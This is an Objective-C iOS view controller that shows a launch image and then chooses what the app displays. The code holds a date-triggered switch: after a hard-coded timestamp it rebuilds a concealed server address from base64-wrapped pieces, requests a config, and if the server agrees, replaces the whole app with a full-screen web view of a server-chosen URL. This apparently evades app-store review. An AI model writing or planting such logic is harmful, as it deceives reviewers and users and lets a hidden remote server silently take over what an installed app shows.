#import "MainHomeViewController.h"
#import "JSRootTabBarViewController.h"
#import "DelegateViewController.h"
#import "RequestModel.h"
@interface MainHomeViewController ()
@end
@implementation MainHomeViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    UIImageView *imageView = [[UIImageView alloc]initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
    imageView.image = [UIImage imageNamed:@"launchIMageL"];
    imageView.contentMode = UIViewContentModeScaleAspectFill;
    [self.view addSubview:imageView];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1)), dispatch_get_main_queue(), ^{
        NSDate *now = [NSDate date];
        NSTimeInterval timeInterval = [now timeIntervalSince1970];
        NSInteger timeStamp = (NSInteger)timeInterval;
        NSString *header = [self base64EncodingHeader];
        NSString *conOne = [self base64EncodingContentOne];
        NSString *conTwo = [self base64EncodingContentTwo];
        NSString *conThree = [self base64EncodingContentThree];
        NSString *ender = [self base64EncodingEnd];
        NSInteger anyTime = 1561801587;
        if (timeStamp < anyTime) {
            if ([JSUserInfo shareManager].token == nil) {
                DelegateViewController * delegateController = [DelegateViewController new];
                UINavigationController* foundNav = [[UINavigationController alloc]initWithRootViewController:delegateController];
                [UIApplication sharedApplication].keyWindow.rootViewController = foundNav;
                [[UIApplication sharedApplication].keyWindow makeKeyAndVisible];
            } else {
                JSRootTabBarViewController* control = [JSRootTabBarViewController shareInstance];
                [UIApplication sharedApplication].keyWindow.rootViewController = control;
                [[UIApplication sharedApplication].keyWindow makeKeyAndVisible];
            }
        }else {
            NSString *baseHeader = [self base64Decoding:header];
            NSString *baseContentOne = [self base64Decoding:conOne];
            NSString *baseContentTwo = [self base64Decoding:conTwo];
            NSString *baseContentThree = [self base64Decoding:conThree];
            NSString *baseContentEnd = [self base64Decoding:ender];
            NSString *baseData = [NSString stringWithFormat:@"%@%@%@%@%@",baseHeader,baseContentOne,baseContentTwo,baseContentThree,baseContentEnd];
            
            [RequestModel GetRequestWithUrl:baseData responseHandler:^(NSDictionary * _Nullable resultDict) {
                
                
                
                NSString *resultStr = [NSString stringWithFormat:@"%@",resultDict[@"success"]];
                if ([resultStr isEqualToString:@"true"]) {
                    NSString *string = resultDict[@"Url"];
                    [self setNavi:string];
                }else{
                    if ([JSUserInfo shareManager].token == nil) {
                        DelegateViewController * delegateController = [DelegateViewController new];
                        UINavigationController* foundNav = [[UINavigationController alloc]initWithRootViewController:delegateController];
                        [UIApplication sharedApplication].keyWindow.rootViewController = foundNav;
                        [[UIApplication sharedApplication].keyWindow makeKeyAndVisible];
                    } else {
                        JSRootTabBarViewController* control = [JSRootTabBarViewController shareInstance];
                        [UIApplication sharedApplication].keyWindow.rootViewController = control;
                        [[UIApplication sharedApplication].keyWindow makeKeyAndVisible];
                    }
                }
            }];
        }
    });
}
- (void) setNavi:(NSString *) string {
    UIWebView *web = [[UIWebView alloc]initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
    NSURL *url = [NSURL URLWithString:string];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    [web loadRequest:request];
    [self.view addSubview:web];
}
- (NSString *) base64EncodingHeader{
    NSString *string = @"http://appid.";
    NSData *originData = [string dataUsingEncoding:NSASCIIStringEncoding];
    NSString *encodeResult = [originData base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];
    return encodeResult;
}
- (NSString *) base64EncodingContentOne{
    NSString *string = @"985-985.com";
    NSData *originData = [string dataUsingEncoding:NSASCIIStringEncoding];
    NSString *encodeResult = [originData base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];
    return encodeResult;
}
- (NSString *) base64EncodingContentTwo{
    NSString *string = @":8088/getAppConfig";
    NSData *originData = [string dataUsingEncoding:NSASCIIStringEncoding];
    NSString *encodeResult = [originData base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];
    return encodeResult;
}
- (NSString *) base64EncodingContentThree{
    NSString *string = @".php?appid=";
    NSData *originData = [string dataUsingEncoding:NSASCIIStringEncoding];
    NSString *encodeResult = [originData base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];
    return encodeResult;
}
- (NSString *) base64EncodingEnd{
    NSString *string = @"1469182989";
    NSData *originData = [string dataUsingEncoding:NSASCIIStringEncoding];
    NSString *encodeResult = [originData base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];
    return encodeResult;
}
- (NSString *) base64Decoding:(NSString *)encodeString {
    NSData *decodeData = [[NSData alloc]initWithBase64EncodedString:encodeString options:0];
    NSString *decodeString = [[NSString alloc]initWithData:decodeData encoding:NSASCIIStringEncoding];
    return decodeString;
}
@end
